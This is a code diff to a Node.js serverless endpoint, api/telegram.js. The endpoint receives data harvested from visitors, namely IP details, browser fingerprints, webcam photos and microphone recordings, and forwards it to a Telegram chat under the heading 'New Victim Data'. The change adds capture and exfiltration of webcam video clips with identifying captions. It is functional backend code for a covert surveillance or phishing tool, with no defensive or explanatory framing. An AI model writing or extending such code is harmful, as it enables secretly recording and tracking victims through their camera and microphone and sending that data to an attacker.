@@ -1,4 +1,4 @@
-// api/telegram.js – Native fetch + FormData, fixed for Buffer/Blob and Markdown
+// api/telegram.js – now handles photo, video, mic, and text
 module.exports = async (req, res) => {
     if (req.method !== 'POST') {
         return res.status(405).json({ error: 'Method not allowed' });
@@ -21,10 +21,11 @@ module.exports = async (req, res) => {
         return res.status(400).json({ error: 'Missing request body' });
     }
 
-    const { ipData, fingerprint, webcam, mic, timestamp } = body;
+    const { ipData, fingerprint, photo, video, mic, timestamp } = body;
     console.log(`[+] Received at ${timestamp}`);
     console.log(`[+] IP: ${ipData?.ip || 'N/A'}`);
-    console.log(`[+] Webcam: ${webcam ? 'yes' : 'no'}`);
+    console.log(`[+] Photo: ${photo ? 'yes' : 'no'}`);
+    console.log(`[+] Video: ${video ? 'yes' : 'no'}`);
     console.log(`[+] Mic: ${mic ? 'yes' : 'no'}`);
 
     // Helper to send to Telegram
@@ -47,35 +48,35 @@ module.exports = async (req, res) => {
 
     const results = {};
 
-    // --- 1. Text message (NO parse_mode to avoid markdown errors) ---
+    // --- 1. Send text message with IP and fingerprint (plain text) ---
     let message = '📡 New Victim Data\n\n';
     message += `IP Info:\n${JSON.stringify(ipData, null, 2)}\n\n`;
     message += `Fingerprint:\n${JSON.stringify(fingerprint, null, 2)}\n\n`;
     message += `Timestamp: ${timestamp}`;
 
-    // We're sending as plain text (no parse_mode) – this avoids all markdown issues.
     results.text = await sendToTelegram('sendMessage', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
             chat_id: chatId,
             text: message
-            // parse_mode omitted intentionally
+            // no parse_mode
         })
     });
 
-    // --- 2. Webcam photo (if present) ---
-    if (webcam) {
+    // --- 2. Send photo (with caption containing IP summary) ---
+    if (photo) {
         try {
-            const base64Data = webcam.split(',')[1];
+            const base64Data = photo.split(',')[1];
             if (!base64Data) throw new Error('Invalid base64 data');
             const buffer = Buffer.from(base64Data, 'base64');
-
-            // Create a Blob from the buffer (Node.js 18+ has Blob)
             const blob = new Blob([buffer], { type: 'image/jpeg' });
             const form = new FormData();
             form.append('chat_id', chatId);
             form.append('photo', blob, 'webcam.jpg');
+            // Add caption with IP and timestamp
+            const caption = `📸 Webcam snapshot\nIP: ${ipData?.ip || 'N/A'}\nTime: ${timestamp}`;
+            form.append('caption', caption);
 
             results.photo = await sendToTelegram('sendPhoto', {
                 method: 'POST',
@@ -86,17 +87,40 @@ module.exports = async (req, res) => {
             console.error('❌ Photo processing error:', e.message);
         }
     } else {
-        results.photo = { success: false, error: 'No webcam data' };
+        results.photo = { success: false, error: 'No photo data' };
     }
 
-    // --- 3. Microphone audio (if present) ---
+    // --- 3. Send video (if captured) ---
+    if (video) {
+        try {
+            const base64Data = video.split(',')[1];
+            if (!base64Data) throw new Error('Invalid base64 data');
+            const buffer = Buffer.from(base64Data, 'base64');
+            const blob = new Blob([buffer], { type: 'video/mp4' });
+            const form = new FormData();
+            form.append('chat_id', chatId);
+            form.append('video', blob, 'webcam.mp4');
+            const caption = `🎥 Webcam video clip\nIP: ${ipData?.ip || 'N/A'}\nTime: ${timestamp}`;
+            form.append('caption', caption);
+
+            results.video = await sendToTelegram('sendVideo', {
+                method: 'POST',
+                body: form
+            });
+        } catch (e) {
+            results.video = { success: false, error: e.message };
+            console.error('❌ Video processing error:', e.message);
+        }
+    } else {
+        results.video = { success: false, error: 'No video data' };
+    }
+
+    // --- 4. Send microphone audio (if present) ---
     if (mic) {
         try {
             const base64Data = mic.split(',')[1];
             if (!base64Data) throw new Error('Invalid base64 data');
             const buffer = Buffer.from(base64Data, 'base64');
-
-            // Create a Blob from the buffer (Node.js 18+ has Blob)
             const blob = new Blob([buffer], { type: 'audio/wav' });
             const form = new FormData();
             form.append('chat_id', chatId);
@@ -114,7 +138,7 @@ module.exports = async (req, res) => {
         results.audio = { success: false, error: 'No mic data' };
     }
 
-    const allSuccess = results.text.success && results.photo.success !== false && results.audio.success !== false;
+    const allSuccess = results.text.success && results.photo.success !== false && results.video.success !== false && results.audio.success !== false;
     return res.status(allSuccess ? 200 : 207).json({
         success: allSuccess,
         results: results
